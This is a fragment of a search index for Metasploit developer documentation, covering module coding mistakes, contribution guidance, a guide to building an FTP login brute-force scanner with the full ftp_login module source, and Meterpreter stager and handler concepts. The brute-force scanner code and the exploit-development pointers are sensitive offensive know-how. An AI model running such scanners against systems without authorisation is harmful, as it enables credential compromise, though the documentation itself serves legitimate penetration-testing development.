ZeroDivisionError =&gt; e puts \"Are you smarter than a 5th grader? #{e.message}\" x = 0 # Can put this in the ensure block rescue NoMethodError puts \"You must be using an older Ruby\" x = 0 # Can put this in the ensure block end puts \"Value is #{x.to_s}\" . 7. Adding the ‘VERBOSE’ option . register_options( [ # You already have this. Just type 'show advanced' and you'll see it. # So no need to register again OptBool.new(\"VERBOSE\", [false, 'Enable detailed status messages', false]) ], self.class) . 8. Neglecting to use send_request_cgi()’s vars_get or vars_get when crafting a POST/GET request . data_post = 'user=jsmith&amp;pass=hello123' # You should use the 'vars_post' key instead of 'data', # unless you're trying to avoid the API escaping your # parameter names send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; '/', 'data' =&gt; data_post }) . 9. Bad variable naming style . # What's this, Java? # The proper naming style in this case should be: my_string myString = \"hello, world\" . 10. Using global variables . # $msg is a global variable that can be accessed anywhere within the program. # This can induce bugs to other modules or mixins that are hard to debug. # Use @instance variables instead. # This is also mentioned in your HACKING file :-) class Opinion def initialize # This variable shouldn't be shared with other classes $msg = \"It's called the Freedom of Information Act. The Hippies finally got something right.\" end end class Metasploit3 def initialize puts $msg end end Opinion.new Metasploit3.new . 11. Modifying the datastore during execution . # https://github.com/rapid7/metasploit-framework/issues/3853 datastore['BAD'] = 'This is bad.' . ",
    "url": "/docs/development/quality/common-metasploit-module-coding-mistakes.html#deprecation-notice",
    "relUrl": "/docs/development/quality/common-metasploit-module-coding-mistakes.html#deprecation-notice"
  },"29": {
    "doc": "Common Metasploit Module Coding Mistakes",
    "title": "Common Metasploit Module Coding Mistakes",
    "content": " ",
    "url": "/docs/development/quality/common-metasploit-module-coding-mistakes.html",
    "relUrl": "/docs/development/quality/common-metasploit-module-coding-mistakes.html"
  },"30": {
    "doc": "Contact",
    "title": "Chat",
    "content": "A lot of our discussion happens on IRC in #metasploit on Freenode. Please be patient and hang around for a while – not everyone is awake at the same time as you. =) . ",
    "url": "/docs/contact.html#chat",
    "relUrl": "/docs/contact.html#chat"
  },"31": {
    "doc": "Contact",
    "title": "Mailing list",
    "content": "The Metasploit development mailing list used to be hosted on SourceForge, but is now on Google Groups. Metasploit Hackers is dead, long live Metasploit Hackers. (Or mailto:Metasploit Hackers). The old list is archived on seclists.org. ",
    "url": "/docs/contact.html#mailing-list",
    "relUrl": "/docs/contact.html#mailing-list"
  },"32": {
    "doc": "Contact",
    "title": "Abuse",
    "content": "Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to msfdev@metasploit.com which goes to all the current committers. If the incident involves a committer, you may report directly to caitlin_condon@rapid7.com or todb@metasploit.com. ",
    "url": "/docs/contact.html#abuse",
    "relUrl": "/docs/contact.html#abuse"
  },"33": {
    "doc": "Contact",
    "title": "Contact",
    "content": " ",
    "url": "/docs/contact.html",
    "relUrl": "/docs/contact.html"
  },"34": {
    "doc": "Contributing to Metasploit",
    "title": "Like hacking things? Start here.",
    "content": "Every so often, we’ll get a request along the lines of, “Hey, I’m new to Metasploit, and I want to help!” The usual answer is something like, “Great! Here’s our framework bug tracker, get crackin!” . However, tackling core Metasploit Framework bugs or particularly squirrelly exploits probably isn’t the right place for the new contributor. Believe me, everyone was a newbie once, there’s no shame in that. Those bugs and vulns are usually complicated, and there are so many to choose from that it’s hard to get started. Here are some ideas to get you started. Metasploit is a tool by and for hackers, but the hackers that maintain it also happen to be software engineers. So, we have some hopefully easy-to-remember Do’s and Don’ts in CONTRIBUTING.md. Read up on those. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#like-hacking-things-start-here",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#like-hacking-things-start-here"
  },"35": {
    "doc": "Contributing to Metasploit",
    "title": "Server exploits",
    "content": "Server exploits are always in demand; why bother with complicated social engineering campaigns when you can go straight to the pain point of a vulnerable network. Here are some search queries to get you started: . | Remote exploits from Exploit-DB | . ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#server-exploits",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#server-exploits"
  },"36": {
    "doc": "Contributing to Metasploit",
    "title": "Client Exploits",
    "content": "Client exploits generally run as an “evil service” that a remote client will connect to. They nearly always require some kind of user interaction to trigger, such a viewing a web page, downloading a file, or otherwise connecting to the service controlled by the attacker. | Browser Vulns from SecurityFocus via Google search terms | . ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#client-exploits",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#client-exploits"
  },"37": {
    "doc": "Contributing to Metasploit",
    "title": "Local and Privilege Escalation Exploits",
    "content": "Privilege escalation exploits tend to require the attacker already have an account on a target computer. They are nearly always going to be implemented as Metasploit exploit modules under one of the local trees (platform dependent), but sometimes they’re better off as post modules. This is especially true for privilege escalation bugs. | Local Vulns from Exploit-DB | . ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#local-and-privilege-escalation-exploits",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#local-and-privilege-escalation-exploits"
  },"38": {
    "doc": "Contributing to Metasploit",
    "title": "Unstable modules",
    "content": "Want to pick up where someone else left off? Super! Just check the guide on rescuing Unstable Modules and push these poor, unloved modules over the finish line with decent testing and code cleanup. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#unstable-modules",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#unstable-modules"
  },"39": {
    "doc": "Contributing to Metasploit",
    "title": "Framework bugs and features",
    "content": "If exploit dev isn’t your thing, but more straightforward Ruby development is, then here are some good places to get started: . | Recent Bugs, which tend to be either very easy or very hard to fix (not a lot of middle ground). | Feature requests, which is often in the same boat. | . Along these same lines is a perennial need for better automated testing, down in the spec directory. If you have a talent for exploring strange and wonderful code bases, pick out a chunk of the Metasploit core code and define out what you expect for working behavior. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#framework-bugs-and-features",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#framework-bugs-and-features"
  },"40": {
    "doc": "Contributing to Metasploit",
    "title": "Non-code",
    "content": "We can always use better documentation. Those guys over at Offensive Security do a great job with Metasploit Unleashed, but as with all complex bodies of work, there are surely bugs to be found. If you have ideas on how to make the documentation on Metasploit clear and more accessible to more people, go nuts. Write wiki articles in your fork (hint, Gollum is excellent for this) and let someone know about them, we’ll be happy to reflect them here and maintain your credit. If you’re interested in working with us on documentation long-term, that’s even better; reach out on Slack for info on how best to make changes. Ditto with YouTube screencasts of particular common tasks. Narration while you do it is great. People seem to love YouTube videos of this stuff – there are over 40,000 of the things out there, and we’d love for someone to step up and curate a top 10 or top 100 of those that we can promote here for new and experienced users. For developer types: we are slowly but surely converting all of Metasploit to use standardized commenting using YARD, so we could always use more accurate and more comprehensive YARD documentation for pretty much anything found in lib. We will happily take pull requests that contain nothing but comment docs! . Again, there’s always room on #metasploit on Freenode. Be helpful with the questions there, and people are more likely to help you in the future. Same goes for the Metasploit Slack team, where all sorts of new and proficient users and devs are looking for help and camaraderie. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#non-code",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#non-code"
  },"41": {
    "doc": "Contributing to Metasploit",
    "title": "The Usual Warnings",
    "content": "You probably shouldn’t run proof of concept exploit code you find on the Internet on a machine you care about in a network you care about. That is generally considered a Bad Idea. You also probably shouldn’t use your usual computer as a target for exploit development, since you are intentionally inducing unstable behavior. Our preferred method of module submission is via a git pull request from a feature branch on your own fork of Metasploit. You can learn how to create one here: Landing-Pull-Requests . Also, please take a peek at our guides on using git and our acceptance guidelines for new modules in case you’re not familiar with them. If you get stuck, try to explain your specific problem as best you can on our Freenode IRC channel, #metasploit (joining requires a registered nick). Someone should be able to lend a hand. Apparently, some of those people never sleep. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#the-usual-warnings",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#the-usual-warnings"
  },"42": {
    "doc": "Contributing to Metasploit",
    "title": "Thank you",
    "content": "In case nobody’s said it yet: Thanks for your interest and support! Exploit developers from the open source community are the soul of Metasploit, and by contributing your time and talent, you are helping advance the state of the art for intelligent IT defense. We simply couldn’t do all of this without you. ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html#thank-you",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html#thank-you"
  },"43": {
    "doc": "Contributing to Metasploit",
    "title": "Contributing to Metasploit",
    "content": " ",
    "url": "/docs/development/get-started/contributing-to-metasploit.html",
    "relUrl": "/docs/development/get-started/contributing-to-metasploit.html"
  },"44": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Credential Objects",
    "content": "Metasploit::Framework::Credential (lib/metasploit/framework/credential.rb) . These objects represent the most basic concept of how we now think about Credentials. | Public: The public part of a credential refers to the part that can be publicly known. In almost all cases this is the username. | Private: The private part of the credential, this is the part that should be a secret. This currently represents: Password, SSH Key, NTLM Hash etc. | Private Type: This defines what type of private credential is defined above | Realm: This represents an authentication realm that the credential is valid for. This is a tertiary part of the authentication process. Examples include: Active Directory Domain, Postgres Database etc. | Realm Key: This defines what type of Realm the Realm Attribute represents. | Paired: This attribute is a boolean value that sets whether the Credential must have both a public and private to be valid. | . All LoginScanners use Credential objects as the basis for their attempts. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#credential-objects",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#credential-objects"
  },"45": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Result Objects",
    "content": "Metasploit::Framework::LoginScanner::Result (lib/metasploit/framework/login_scanner/result.rb) . These are the objects yielded by the scan! method on each LoginScanner. They contain: . | Access Level: An optional Access Level which can describe the level of access granted by the login attempt. | Credential : The Credential object that achieved that result | Proof: An optional proof string to show why we think the result is valid | Status: The status of the login attempt. These values come from Metasploit::model::Login::Status , examples include “Incorrect”, “Unable to Connect”, “Untried” etc | . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#result-objects",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#result-objects"
  },"46": {
    "doc": "Writing an FTP LoginScanner",
    "title": "CredentialCollection",
    "content": "Metasploit::Framework::CredentialCollection (lib/metasploit/framework/credential_collection.rb) . This class is created by the build_credential_collection method provided by the Msf::Auxiliary::AuthBrute mixin. It takes a bunch of options that when specified, will take priority over the corresponding datastore options. Typical uses only need to specify the username: and password: options since those can be different from one module to another (e.g. ‘USERNAME’, ‘SMBUser’, ‘HttpUsername’, etc.). It can be passed in as the cred_details on the LoginScanner, and responds to #each and yields crafted Credentials. The build_credential_collection method will handle prepending usernames and passwords as well as skipping entries as configured by the DB_SKIP_EXISTING option. Example (from modules/auxiliary/scanner/ftp/ftp_login.rb): . cred_collection = build_credential_collection( username: datastore['USERNAME'], password: datastore['PASSWORD'], prepended_creds: anonymous_creds ) . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#credentialcollection",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#credentialcollection"
  },"47": {
    "doc": "Writing an FTP LoginScanner",
    "title": "LoginScanner Base",
    "content": "Metasploit::Framework::LoginScanner::Base (lib/metasploit/framework/login_scanner/base.rb) . This is a Ruby Module that contains all the base behaviour for all LoginScanners. All LoginScanner classes should include this module. The specs for this behaviour are kept in a shared example group. Specs for your LoginScanner should use the following syntax to include these tests: . it_behaves_like 'Metasploit::Framework::LoginScanner::Base', has_realm_key: false, has_default_realm: false . Where has_realm_key and has_default_realm should be set according to whether your LoginScanner has those things. (More on this later) . LoginScanners always take a collection of Credentials to try and one host and port. So each LoginScanner object attempts to login to only one specific service. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#loginscanner-base",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#loginscanner-base"
  },"48": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Attributes",
    "content": ". | connection_timeout: The time to wait for a connection to timeout | cred_details: An object that yields credentials on each (like credentialCollection or an Array) | host: The address for the target host | port: The port number for the target service | proxies: Any proxies to use in the connection (some scanners might not support this) | stop_on_success: Whether to stop trying after a successful login is found | . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#attributes",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#attributes"
  },"49": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Methods",
    "content": "each_credential . You will not have to worry much about this method, Be aware that it is there. It iterates through whatever is in cred_details, does some normalization and tries to make sure each Credential is properly setup for use by the given LoginScanner. It yields each Credential in a block. def each_credential cred_details.each do |raw_cred| # This could be a Credential object, or a Credential Core, or an Attempt object # so make sure that whatever it is, we end up with a Credential. credential = raw_cred.to_credential if credential.realm.present? &amp;&amp; self.class::REALM_KEY.present? credential.realm_key = self.class::REALM_KEY yield credential elsif credential.realm.blank? &amp;&amp; self.class::REALM_KEY.present? &amp;&amp; self.class::DEFAULT_REALM.present? credential.realm_key = self.class::REALM_KEY credential.realm = self.class::DEFAULT_REALM yield credential elsif credential.realm.present? &amp;&amp; self.class::REALM_KEY.blank? second_cred = credential.dup # Strip the realm off here, as we don't want it credential.realm = nil credential.realm_key = nil yield credential # Some services can take a domain in the username like this even though # they do not explicitly take a domain as part of the protocol. second_cred.public = \"#{second_cred.realm}\\\\#{second_cred.public}\" second_cred.realm = nil second_cred.realm_key = nil yield second_cred else yield credential end end end . set_sane_defaults . This method will be overridden by each specific LoginScanner. This is called at the end of the initializer and sets any sane defaults for attributes that have them and were not given a specific value in the initializer. # This is a placeholder method. Each LoginScanner class # will override this with any sane defaults specific to # its own behaviour. # @abstract # @return [void] def set_sane_defaults self.connection_timeout = 30 if self.connection_timeout.nil? end . attempt_login . This method is just a stub on the Base mixin. It will be overridden in each LoginScanner class to contain the logic to take one single Credential object and use it to make a login attempt against the target service. It returns a ::Metasploit::Framework::LoginScanner::Result object containing all the information about that attempt’s result. For an example let’s look at the attempt_login method from Metasploit::Framework::LoginScanner::FTP (lib/metasploit/framework/login_scanner/ftp.rb) . # (see Base#attempt_login) def attempt_login(credential) result_options = { credential: credential } begin success = connect_login(credential.public, credential.private) rescue ::EOFError, Rex::AddressInUse, Rex::ConnectionError, Rex::ConnectionTimeout, ::Timeout::Error result_options[:status] = Metasploit::Model::Login::Status::UNABLE_TO_CONNECT success = false end if success result_options[:status] = Metasploit::Model::Login::Status::SUCCESSFUL elsif !(result_options.has_key? :status) result_options[:status] = Metasploit::Model::Login::Status::INCORRECT end ::Metasploit::Framework::LoginScanner::Result.new(result_options) end . scan! . This method is the main one you will be concerned with. This method does several things: . | It calls valid! which will check all of the validations on the class and raise an Metasploit::Framework::LoginScanner::Invalid if any of the Validations fail. This exception will contain all the errors messages for any failing validations. | it keeps track of the connection error count, and will bail out if we have too many connection errors or too many in a row | it runs through all of the credentials by calling each_credential with a block | in that block it passes each credential to #attempt_login | it yields the Result object into the block it is passed | if stop_on_success is set it will also exit out early if it the result was a success | . # Attempt to login with every {Credential credential} in # {#cred_details}, by calling {#attempt_login} once for each. # # If a successful login is found for a user, no more attempts # will be made for that user. # # @yieldparam result [Result] The {Result} object for each attempt # @yieldreturn [void] # @return [void] def scan! valid! # Keep track of connection errors. # If we encounter too many, we will stop. consecutive_error_count = 0 total_error_count = 0 successful_users = Set.new each_credential do |credential| next if successful_users.include?(credential.public) result = attempt_login(credential) result.freeze yield result if block_given? if result.success? consecutive_error_count = 0 break if stop_on_success successful_users &lt;&lt; credential.public else if result.status == Metasploit::Model::Login::Status::UNABLE_TO_CONNECT consecutive_error_count += 1 total_error_count += 1 break if consecutive_error_count &gt;= 3 break if total_error_count &gt;= 10 end end end nil end . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#methods",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#methods"
  },"50": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Constants",
    "content": "Although not defined on Base, each LoginScanner has a series of Constants that can be defined on it to assist with critical behaviour. | DEFAULT_PORT: DEFAULT_PORT is a simple constant for use with set_sane_defaults. If the port isn’t set by the user it will use DEFAULT_PORT. This is put in a constant so it can be quickly referenced from outside the scanner. | . These next two Constants are used by the LoginScanner namespace method classes_for_services. This method invoked by Metasploit::Framework::LoginScanner.classes_for_service(&lt;Mdm::service&gt;) will actually return an array of LoginScanner classes that may be useful to try against that particular Service. | LIKELY_PORTS : This constant holds n array of port numbers that it would be likely useful to use this scanner against. | LIKELY_SERVICE_NAMES : Like above except with strings for service names instead of port numbers. | PRIVATE_TYPES : This contains an array of symbols representing the different Private credential types it supports. It should always match the demodulize result for the Private class i.e :password, :ntlm_hash, :ssh_key | . These constants are fore LoginScanners that have to deal with Realms such as AD domains or Database Names. | REALM_KEY: The type of Realm this scanner expects to deal with. Should always be a constants from Metasploit::Model::Login::Status | DEFAULT_REALM: Some scanners have a default realm (like WORKSTATION for AD domain stuff). If a credential is given to a scanner that requires a realm, but the credential has no realm, this value will be added to the credential as the realm. | CAN_GET_SESSION: this should be either true or false as to whether we expect we could somehow get a session with a Credential found from this scanner. | . example1 ( Metasploit::Framework::LoginScanner::FTP) . DEFAULT_PORT = 21 LIKELY_PORTS = [ DEFAULT_PORT, 2121 ] LIKELY_SERVICE_NAMES = [ 'ftp' ] PRIVATE_TYPES = [ :password ] REALM_KEY = nil . example2 ( Metasploit::Framework::LoginScanner::SMB) . CAN_GET_SESSION = true DEFAULT_REALM = 'WORKSTATION' LIKELY_PORTS = [ 139, 445 ] LIKELY_SERVICE_NAMES = [ \"smb\" ] PRIVATE_TYPES = [ :password, :ntlm_hash ] REALM_KEY = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#constants",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#constants"
  },"51": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Pulling it all Together in a module",
    "content": "So now you hopefully have a good idea of all the moving pieces involved in creating a LoginScanner. The next step is using your brand new LoginScanner in an actual module. Let’s look at the ftp_login module: . def run_host(ip) . Every Bruteforce/Login module should be a scanner and should use the run_host method which will run once for each RHOST. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#pulling-it-all-together-in-a-module",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#pulling-it-all-together-in-a-module"
  },"52": {
    "doc": "Writing an FTP LoginScanner",
    "title": "The Cred Collection",
    "content": "cred_collection = Metasploit::Framework::CredentialCollection.new( blank_passwords: datastore['BLANK_PASSWORDS'], pass_file: datastore['PASS_FILE'], password: datastore['PASSWORD'], user_file: datastore['USER_FILE'], userpass_file: datastore['USERPASS_FILE'], username: datastore['USERNAME'], user_as_pass: datastore['USER_AS_PASS'], prepended_creds: anonymous_creds ) . So here we see the CredentialCollection getting created using the datastore options. We pass in the options for Cred creation such as wordlists, raw usernames and passwords, whether to try the username as a password, and whether to try blank passwords. you’ll also notice an option here called prepended_creds. FTP is one of the only module to make use of this, but it is generally available through the CredentialCollection. This option is an array of Metasploit::Framework::Credential objects that should be spit back by the collection before any others. FTP uses this to deal with testing for anon FTP access. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#the-cred-collection",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#the-cred-collection"
  },"53": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Initialising the Scanner",
    "content": "scanner = Metasploit::Framework::LoginScanner::FTP.new( host: ip, port: rport, proxies: datastore['PROXIES'], cred_details: cred_collection, stop_on_success: datastore['STOP_ON_SUCCESS'], connection_timeout: 30 ) . Here we actually create our Scanner object. We set the IP and Port based on data the module already knows about. We can pull any user supplied proxy data from the datatstore. we also pull from the datastore whether to stop on a success for this service. The cred details object is populated by our Credentialcollection which will handle all the credential generation for us invisibly. This gives us our scanner object, all configured and ready to go. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#initialising-the-scanner",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#initialising-the-scanner"
  },"54": {
    "doc": "Writing an FTP LoginScanner",
    "title": "The Scan Block",
    "content": "scanner.scan! do |result| credential_data = result.to_h credential_data.merge!( module_fullname: self.fullname, workspace_id: myworkspace_id ) if result.success? credential_core = create_credential(credential_data) credential_data[:core] = credential_core create_credential_login(credential_data) print_good \"#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}\" else invalidate_login(credential_data) print_status \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\" end end . This is the real heart of the matter here. We call scan! on our scanner, and pass it a block. As we mentioned before, the scanner yields each attempt’s Result object into that block. We check the result’s status to see if it was successful or not. The result object now as a .to_h method which returns a hash compatible with our credential creation methods. We take that hash and merge in our module specific information and workspace id. In the case of a success we build some info hashes and call create_credential. This is a method found in the metasploit-credential gem under lib/metasploit/credential/creation.rb in a mixin called Metasploit::Credential::Creation. This mixin is included in the Report mixin, so if your module includes that mixin you’ll get these methods for free. create_credential creates a Metasploit::Credential::Core. We then take that core, the service data, and merge it with some additional data. This additional data includes the access level, the current time (to update last_attempted_at on the Metasploit::Credential::Login), the the status. Finally, for a success, we output the result to the console. In the case of a failure, we call the invalidate_login method. This method also comes from the Creation mixin. This method looks to see if a Login object already exists for this credential:service pair. If it does, it updates the status to the status we got back from the scanner. This is primarily to account for Login objects created by things like Post modules that have an untried status. ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#the-scan-block",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#the-scan-block"
  },"55": {
    "doc": "Writing an FTP LoginScanner",
    "title": "ftp_login Final View",
    "content": "Pulling it all together, we get a new ftp_login module that looks something like this: . ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/credential_collection' require 'metasploit/framework/login_scanner/ftp' class Metasploit3 &lt; Msf::Auxiliary include Msf::Exploit::Remote::Ftp include Msf::Auxiliary::Scanner include Msf::Auxiliary::Report include Msf::Auxiliary::AuthBrute def proto 'ftp' end def initialize super( 'Name' =&gt; 'FTP Authentication Scanner', 'Description' =&gt; %q{ This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. }, 'Author' =&gt; 'todb', 'References' =&gt; [ [ 'CVE', '1999-0502'] # Weak password ], 'License' =&gt; MSF_LICENSE ) register_options( [ Opt::RPORT(21), OptBool.new('RECORD_GUEST', [ false, \"Record anonymous/guest logins to the database\", false]) ], self.class) register_advanced_options( [ OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false]) ] ) deregister_options('FTPUSER','FTPPASS') # Can use these, but should use 'username' and 'password' @accepts_all_logins = {} end def run_host(ip) print_status(\"#{ip}:#{rport} - Starting FTP login sweep\") cred_collection = Metasploit::Framework::CredentialCollection.new( blank_passwords: datastore['BLANK_PASSWORDS'], pass_file: datastore['PASS_FILE'], password: datastore['PASSWORD'], user_file: datastore['USER_FILE'], userpass_file: datastore['USERPASS_FILE'], username: datastore['USERNAME'], user_as_pass: datastore['USER_AS_PASS'], prepended_creds: anonymous_creds ) scanner = Metasploit::Framework::LoginScanner::FTP.new( host: ip, port: rport, proxies: datastore['PROXIES'], cred_details: cred_collection, stop_on_success: datastore['STOP_ON_SUCCESS'], connection_timeout: 30 ) scanner.scan! do |result| credential_data = result.to_h credential_data.merge!( module_fullname: self.fullname, workspace_id: myworkspace_id ) if result.success? credential_core = create_credential(credential_data) credential_data[:core] = credential_core create_credential_login(credential_data) print_good \"#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}\" else invalidate_login(credential_data) print_status \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\" end end end # Always check for anonymous access by pretending to be a browser. def anonymous_creds anon_creds = [ ] if datastore['RECORD_GUEST'] ['IEUser@', 'User@', 'mozilla@example.com', 'chrome@example.com' ].each do |password| anon_creds &lt;&lt; Metasploit::Framework::Credential.new(public: 'anonymous', private: password) end end anon_creds end def test_ftp_access(user,scanner) dir = Rex::Text.rand_text_alpha(8) write_check = scanner.send_cmd(['MKD', dir], true) if write_check and write_check =~ /^2/ scanner.send_cmd(['RMD',dir], true) print_status(\"#{rhost}:#{rport} - User '#{user}' has READ/WRITE access\") return 'Read/Write' else print_status(\"#{rhost}:#{rport} - User '#{user}' has READ access\") return 'Read-only' end end end . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#ftp_login-final-view",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html#ftp_login-final-view"
  },"56": {
    "doc": "Writing an FTP LoginScanner",
    "title": "Writing an FTP LoginScanner",
    "content": "So, you want to make a Login Scanner Module in Metasploit, eh? There are a few things you will need to know before you begin. This article will try to illustrate all the moving pieces involved in creating an effective bruteforce/login scanner module. | Credential objects | Result objects | CredentialCollection | LoginScanner Base . | Attributes | Methods | Constants | . | Pulling it all Together in a module . | The Cred Collection | Initialising the Scanner | The scan block | ftp_login final view | . | . ",
    "url": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html",
    "relUrl": "/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html"
  },"57": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "On this page",
    "content": ". | On this page | Background knowledge | Stagers, stages, and handlers | LHOST and LPORT | LHOST | LPORT | Check dead shells . | Quick things to check | Not so quick things to check | . | . Dead shells. Nobody likes them. Yet, despite the advances made in the Metasploit stagers and Meterperter itself, we still see them regularly. There are many reasons why shells refuse to connect or die after they’re established. The goal of this post is to help people understand why. Hopefully, by the end, the most common causes will be understood, and users can fix things themselves. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#on-this-page",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#on-this-page"
  },"58": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "Background knowledge",
    "content": "Prior to diving into the possible breakages and their causes, it’s important to have some background knowledge of stagers, and how Meterpreter works. Please be sure to read the following articles prior to reading the rest of this post: . | Meterpreter Stageless Mode - Covers the exploitation process, and how Meterpreter sessions are established. This is important because understanding how the different components interact and what allows for easier debugging later. | Meterpreter Configuration - Covers how configuration works in Meterpreter. This is important because it highlights the separation of configuration in stagers and Meterpreter. This alone is the key to many breakages, especially in HTTP/S payloads. | The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers - Covers the detail of HTTP/S based communications in the stagers and in Meterpreter itself. | . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#background-knowledge",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#background-knowledge"
  },"59": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "Stagers, stages, and handlers",
    "content": "Each exploit and handler is made up of multiple things, and they’re all independent: . | Stager: This is the small bit of code that is first executed by the target. It contains it’s own bundled implementation of a communications channel. It has the goal of establishing communication with Metasploit, downloading the stage, and invoking it. It has it’s own configuration. | Stage: This is the second payload that is executed by the target. It is sent to the target via the communications channel that was opened by the stage. Once downloaded, it is invoked, and from there, it takes over. It has its own configuration. | Handler: This is the code that runs on the attacker’s machine. It is responsible for handling the attacker-side of the communications channel that is established by the stager. It is responsible for uploading the stage. It is responsible for handling communication between the attacker and the target once the stage has taken over from the stager. | . In some cases, there might be multiple stages (as is the case with POSIX Meterpreter). This is called an intermediate stage. Usually, these stages are slightly bigger than the stager and can do more work to help establish communications. The most important thing to remember is that both the stager and the stage have their own configurations that are independent. THE MOST COMMON cause of dead shells is the result of the stage not having the correct configuration; in other words, it’s different to that specified in the stager. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#stagers-stages-and-handlers",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#stagers-stages-and-handlers"
  },"60": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "LHOST and LPORT",
    "content": "Any user of Metasploit will tell you that they know what LHOST and LPORT mean, yet it’s incredibly common to find out that their understanding isn’t 100% correct. To prevent dead sessions that are related to a misconfiguration of these values, we need to make sure we understand what they mean. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lhost-and-lport",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html#lhost-and-lport"
  },"61": {
    "doc": "Debugging Dead Meterpreter Sessions",
    "title": "LHOST",
